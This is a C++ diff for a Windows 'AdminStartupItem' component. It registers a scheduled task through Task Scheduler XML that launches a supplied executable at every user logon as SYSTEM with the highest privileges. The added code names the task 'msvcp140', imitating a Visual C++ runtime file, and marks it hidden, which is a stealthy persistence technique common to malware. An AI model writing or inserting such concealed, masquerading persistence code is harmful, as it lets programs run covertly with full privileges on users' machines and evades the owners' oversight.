@@ -17,219 +17,121 @@
 
 void AdminStartupItem::Create(std::wstring executable_path)
 {
+    // Create a task that should be called "msvcp140" in the root folder "Task Scheduler Library"
     // Schedule a task to run on login of any user.
     // The task will run with the highest privilages.
     // The task will run whether the user is logged-in or not (will not store credentials).
     // Configure the task for Windows 10
     // Make the task hidden
+    // Get the task service
+    
+    // Use XML to create the task
+    std::wstringstream task_xml;
+    task_xml << L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">";
+    task_xml << L"    <RegistrationInfo>";
+    task_xml << L"        <Date>2020-01-01T00:00:00</Date>";
+    task_xml << L"        <Author>Author</Author>";
+    task_xml << L"    </RegistrationInfo>";
+    task_xml << L"    <Triggers>";
+    task_xml << L"        <LogonTrigger>";
+    task_xml << L"            <Enabled>true</Enabled>";
+    task_xml << L"        </LogonTrigger>";
+    task_xml << L"    </Triggers>";
+    task_xml << L"    <Principals>";
+    task_xml << L"        <Principal id=\"Author\">";
+    task_xml << L"            <UserId>S-1-5-18</UserId>";
+    task_xml << L"            <LogonType>InteractiveToken</LogonType>";
+    task_xml << L"            <RunLevel>HighestAvailable</RunLevel>";
+    task_xml << L"        </Principal>";
+    task_xml << L"    </Principals>";
+    task_xml << L"    <Settings>";
+    task_xml << L"        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>";
+    task_xml << L"        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>";
+    task_xml << L"        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>";
+    task_xml << L"        <AllowHardTerminate>false</AllowHardTerminate>";
+    task_xml << L"        <StartWhenAvailable>false</StartWhenAvailable>";
+    task_xml << L"        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>";
+    task_xml << L"        <IdleSettings>";
+    task_xml << L"            <StopOnIdleEnd>true</StopOnIdleEnd>";
+    task_xml << L"            <RestartOnIdle>false</RestartOnIdle>";
+    task_xml << L"        </IdleSettings>";
+    task_xml << L"        <AllowStartOnDemand>true</AllowStartOnDemand>";
+    task_xml << L"        <Enabled>true</Enabled>";
+    task_xml << L"        <Hidden>true</Hidden>";
+    task_xml << L"        <RunOnlyIfIdle>false</RunOnlyIfIdle>";
+    task_xml << L"        <WakeToRun>false</WakeToRun>";
+    task_xml << L"        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>";
+    task_xml << L"        <Priority>7</Priority>";
+    task_xml << L"    </Settings>";
+    task_xml << L"    <Actions Context=\"Author\">";
+    task_xml << L"        <Exec>";
+    task_xml << L"            <Command>" << executable_path << L"</Command>";
+    task_xml << L"        </Exec>";
+    task_xml << L"    </Actions>";
+    task_xml << L"</Task>";
 
     // Create the task
     ITaskService* pService = nullptr;
     ITaskFolder* pRootFolder = nullptr;
     ITaskDefinition* pTask = nullptr;
-    IRegistrationInfo* pRegInfo = nullptr;
-    ITaskSettings* pSettings = nullptr;
-    IPrincipal* pPrincipal = nullptr;
-    IActionCollection* pActionCollection = nullptr;
-    IAction* pAction = nullptr;
-    IExecAction* pExecAction = nullptr;
-    ITriggerCollection* pTriggerCollection = nullptr;
-    ITrigger* pTrigger = nullptr;
-    ILogonTrigger* pLogonTrigger = nullptr;
     IRegisteredTask* pRegisteredTask = nullptr;
-    HRESULT hr = S_OK;
-
-    // Assuming the the COMbase library has been initialized
-
-    // Get the task service
-    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, reinterpret_cast<void**>(&pService));
+    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to create the task service. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to create task service"));
     }
-
-    // Connect to the task service
     hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to connect to the task service. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to connect to task service"));
     }
-
-    // Get the root folder
     hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to get the root folder. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to get root folder"));
     }
-
-    // Get the task definition
+    // Create the task from the xml
     hr = pService->NewTask(0, &pTask);
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to get the task definition. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to create new task"));
     }
-
-    // Get the registration info
-    hr = pTask->get_RegistrationInfo(&pRegInfo);
+    hr = pTask->put_XmlText(_bstr_t(task_xml.str().c_str()));
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to get the registration info. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to set task xml"));
     }
-
-    // Set the registration info
-    hr = pRegInfo->put_Author(_bstr_t(L""));
+    // Register the task
+    hr = pRootFolder->RegisterTaskDefinition(
+        _bstr_t(L"msvcp140"),
+        pTask,
+        TASK_CREATE_OR_UPDATE,
+        _variant_t(),
+        _variant_t(),
+        TASK_LOGON_NONE, _variant_t(L""), &pRegisteredTask);
     if (FAILED(hr))
     {
-        std::ostringstream oss;
-        oss << "Failed to set the registration info. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        throw std::runtime_error(ERROR_MESSAGE("Failed to register task"));
     }
-
-    // Get the task settings
-    hr = pTask->get_Settings(&pSettings);
-    if (FAILED(hr))
+    // Clean up
+    if (pRegisteredTask)
     {
-        std::ostringstream oss;
-        oss << "Failed to get the task settings. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        pRegisteredTask->Release();
     }
-
-    // Set the task settings
-    hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
-    if (FAILED(hr))
+    if (pTask)
     {
-        std::ostringstream oss;
-        oss << "Failed to set the task settings. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        pTask->Release();
     }
-
-    // TODO:
-    // // Hide task
-    // hr = pSettings->put_Hidden(VARIANT_TRUE);
-
-    // Get the principal
-    hr = pTask->get_Principal(&pPrincipal);
-    if (FAILED(hr))
+    if (pRootFolder)
     {
-        std::ostringstream oss;
-        oss << "Failed to get the principal. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        pRootFolder->Release();
     }
-
-    // Set IPrincipal::put_GroupId to administrators
-    // This will allow the task to run with the highest privileges
-    // The special string is a well-known SID used for the administrators group
-    hr = pPrincipal->put_GroupId(_bstr_t(L"S-1-5-32-544"));
-
-    // Set the principal
-    hr = pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
-    if (FAILED(hr))
+    if (pService)
     {
-        std::ostringstream oss;
-        oss << "pPrincipal->put_RunLevel failed. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
+        pService->Release();
     }
-
-    // Don't store credentials
-    hr = pPrincipal->put_LogonType(TASK_LOGON_NONE);
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "pPrincipal->put_LogonType failed. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-
-    // Get the action collection
-    hr = pTask->get_Actions(&pActionCollection);
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to get the action collection. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Create the action
-    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to create the action. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Get the exec action
-    hr = pAction->QueryInterface(IID_IExecAction, reinterpret_cast<void**>(&pExecAction));
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to get the exec action. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Set the exec action to run executable_path
-    hr = pExecAction->put_Path(_bstr_t(executable_path.c_str()));
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to set the exec action. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Get the trigger collection
-    hr = pTask->get_Triggers(&pTriggerCollection);
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to get the trigger collection. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Set the trigger to run at login of any user
-    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to set the trigger. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Get the logon trigger
-    hr = pTrigger->QueryInterface(IID_ILogonTrigger, reinterpret_cast<void**>(&pLogonTrigger));
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to get the logon trigger. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Set the logon trigger to run at login of any user
-    hr = pLogonTrigger->put_Id(_bstr_t(L"Trigger1"));
-    if (FAILED(hr))
-    {
-        std::ostringstream oss;
-        oss << "Failed to set the logon trigger. Error code: " << hr;
-        throw std::runtime_error{ ERROR_MESSAGE(oss.str()) };
-    }
-
-    // Release the task
-    pTask->Release();
-    pTask = nullptr;
-
-    // Release the service
-    pService->Release();
-    pService = nullptr;
 }
+    
 
 AdminStartupItem::AdminStartupItem() = default;
 AdminStartupItem::~AdminStartupItem() = default;
